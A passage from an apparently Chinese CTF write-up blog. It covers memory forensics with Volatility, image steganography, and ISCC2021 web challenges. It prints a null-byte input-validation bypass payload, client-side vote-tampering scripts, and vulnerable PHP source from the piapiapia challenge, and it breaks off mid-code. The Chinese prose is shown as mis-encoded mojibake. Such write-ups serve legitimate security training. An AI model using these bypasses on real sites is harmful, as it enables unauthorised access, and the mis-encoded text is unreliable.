class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep fl4g                 <br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002052028      1      0 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\æ¡Œé¢\fl4g.zip<br></code></pre></td></tr></table></figure><p>9.æŠŠfl4gæ–‡ä»¶dumpä¸‹æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~/volatility2.6]<br>â””â”€$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002052028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02052028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\æ¡Œé¢\fl4g.zip<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åç¼€ä¸ºzipï¼Œè§£å‹å‡ºæ¥flag.pngå’Œflag.jpg</p><p>10.LSBåŒå›¾éšå†™<br>å…ˆç”¨StegSloveæ‰“å¼€flag.pngï¼Œç„¶åç‚¹å‡»Analyse-&gt;Image Combineræ‰“å¼€flag.jpgï¼Œè¿›è¡Œå¼‚æˆ–ä¼šå¾—åˆ°äºŒç»´ç <br><img src="https://img-blog.csdnimg.cn/20210603205142989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>11.æ‰«ç è§£flag</p><p>äºŒç»´ç ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://fanyi.baidu.com/translate?aldtype=16047&amp;query=%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7&amp;keyfrom=baidu&amp;smartresult=dict&amp;lang=auto2zh<span class="hljs-comment">#zh/en/%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®è¯»éŸ³æœ€ç»ˆflagä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;abcdefg&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æµé‡åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2021 Web WP</title>
    <link href="/2021/05/27/ISCC2021-Web-WP/"/>
    <url>/2021/05/27/ISCC2021-Web-WP/</url>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="ç»ƒæ­¦"><a href="#ç»ƒæ­¦" class="headerlink" title="ç»ƒæ­¦"></a>ç»ƒæ­¦</h1><h2 id="ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰"><a href="#ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰" class="headerlink" title="ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰"></a>ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰</h2><blockquote><p>åˆåˆ°äº†ä¸€å¹´ä¸€åº¦çš„ISCCï¼Œå®¢æœä¸€å·ä¸ºäº†ä¿ä½é¥­ç¢—ï¼ˆè¢«è¿«ï¼‰å‚ä¸äº†ä»Šå¹´çš„å®¢æœæµ·é€‰æŠ•ç¥¨ã€‚ç»è¿‡æ¿€çƒˆçš„è§’é€ï¼Œå®¢æœä¸€å·ç»ˆäºå‡­å€Ÿç€è‡ªå·±å¤šå¹´çš„å®¢æœç»éªŒæ¥åˆ°å†³èµ›çš„èˆå°ï¼Œå´å‘ç°å¯¹æ‰‹ç«Ÿæ˜¯è‡ªå·±ï¼Ÿï¼Ÿï¼Ÿ<br>è¯·å¸®åŠ©çœŸæ­£çš„å®¢æœä¸€å·åœ¨æŠ•ç¥¨ä¸­å–èƒœï¼Œä¿ä½å®¢æœä¸€å·çš„é¥­ç¢—ï¼ é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:7020/">http://39.96.91.106:7020</a></p></blockquote><p><strong>æ–¹æ³•ä¸€</strong>ï¼šä½¿ç”¨è¿ç‚¹å™¨<br>è®¾ç½®æ¯ç§’ç‚¹å‡»100æ¬¡ï¼Œå¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210501144653201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>æ–¹æ³•äºŒ</strong>ï¼šä¿®æ”¹æŒ‰é’®ID<br>F12å°†ä¸¤ä¸ªæŒ‰é’®çš„idäº¤æ¢<img src="https://img-blog.csdnimg.cn/20210505160357289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>æ–¹æ³•ä¸‰</strong>ï¼š<br>jsè°ƒç”¨clickå‡½æ•°ï¼Œæ§åˆ¶å°è¾“å…¥</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;left_button&quot;</span>).click();&#125;,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•å››</strong>ï¼šåˆ·ç¥¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">local_left_votes=<span class="hljs-number">999999</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210505162648614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="è¿™æ˜¯å•¥"><a href="#è¿™æ˜¯å•¥" class="headerlink" title="è¿™æ˜¯å•¥"></a>è¿™æ˜¯å•¥</h2><blockquote><p>è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿ<br>é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:7030/">http://39.96.91.106:7030</a></p></blockquote><p>ä¸‹è½½é™„ä»¶ï¼Œå°†jsfuckç¼–ç ä¸¢åˆ°æ§åˆ¶å°å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210501112110324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ­£åˆ™åŒ¹é…æœ€åçš„å€”å¼ºã€‚"><a href="#æ­£åˆ™åŒ¹é…æœ€åçš„å€”å¼ºã€‚" class="headerlink" title="æ­£åˆ™åŒ¹é…æœ€åçš„å€”å¼ºã€‚"></a>æ­£åˆ™åŒ¹é…æœ€åçš„å€”å¼ºã€‚</h2><p>æŒ‰ç…§æç¤ºè®¿é—®robots.txtï¼Œä¸å…è®¸æ‰€æœ‰äººè®¿é—®/src/code/code.txt<br><img src="https://img-blog.csdnimg.cn/20210502115331384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¿é—®/code/code.txtå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;p&gt;code.txt&lt;/p&gt;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>     <br><span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br><br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br>&#123;    <br>    <br><span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>BugkuåŸé¢˜ï¼Œä¼ å…¥çš„å€¼å¿…é¡»æ˜¯æ•°å­—æˆ–å¤§å°å†™å­—ç¬¦ï¼Œé•¿åº¦å°äº8ä¸”å¤§äº9999999,ä¸”åŒ¹é…åˆ°â€-â€œæ‰èƒ½è¾“å‡ºflagã€‚å¯ä»¥ä½¿ç”¨%00æ¥æˆªæ–­ï¼Œå½“eregå‡½æ•°è¯»åˆ° %00çš„æ—¶å€™ï¼Œå°±æˆªæ­¢äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure><p>flagï¼š<br><img src="https://img-blog.csdnimg.cn/20210502115236778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="ISCC{1SCc-202i}"></p><h2 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h2><blockquote><p>ç™»å½•æ¥ä¸Šä¼ è‡ªå·±çš„ä¿¡æ¯å§ï¼<br>é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:7010/">http://39.96.91.106:7010</a></p></blockquote><p>è¿™æ˜¯ä¸€é“åŸé¢˜ï¼š [0CTF 2016] piapiapia,å‚è€ƒ<a href="https://www.cnblogs.com/litlife/p/11690918.html#0x02-0ctf-2016-piapiapia">wp</a><br><img src="https://img-blog.csdnimg.cn/20210504124735854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><a href="http://www.zipæºç æ³„éœ²,å¯ç›´æ¥ä¸‹è½½æºç ./">www.zipæºç æ³„éœ²ï¼Œå¯ç›´æ¥ä¸‹è½½æºç ã€‚</a><br><img src="https://img-blog.csdnimg.cn/20210501145644459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æºç å¦‚ä¸‹ï¼š</p><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-variable">$username</span>, md5(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::insert(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === md5(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;link = mysql_connect(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br>mysql_select_db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br>mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> mysql_fetch_object(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . implode(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br>session_start();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> user();<br><span class="hljs-variable">$user</span>-&gt;connect(<span class="hljs-variable">$config</span>);<br><br></code></pre></td></tr></table></figure><p> register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$username</span>) &gt; <span 